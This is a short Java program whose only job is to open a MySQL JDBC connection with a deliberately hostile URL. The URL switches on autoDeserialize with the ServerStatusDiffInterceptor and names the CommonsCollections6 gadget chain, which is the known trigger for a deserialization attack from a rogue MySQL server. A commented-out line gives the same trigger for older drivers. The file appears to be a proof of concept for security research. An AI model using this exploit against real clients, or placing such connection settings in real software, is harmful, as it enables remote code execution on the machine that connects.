import java.sql.*;

public class Client {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        String driver = "com.mysql.jdbc.Driver";
        String DB_URL = "jdbc:mysql://localhost:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=CommonsCollections6";
        //String DB_URL = "jdbc:mysql://localhost:3306/test?statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true&user=CommonsCollections6";
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
    }
}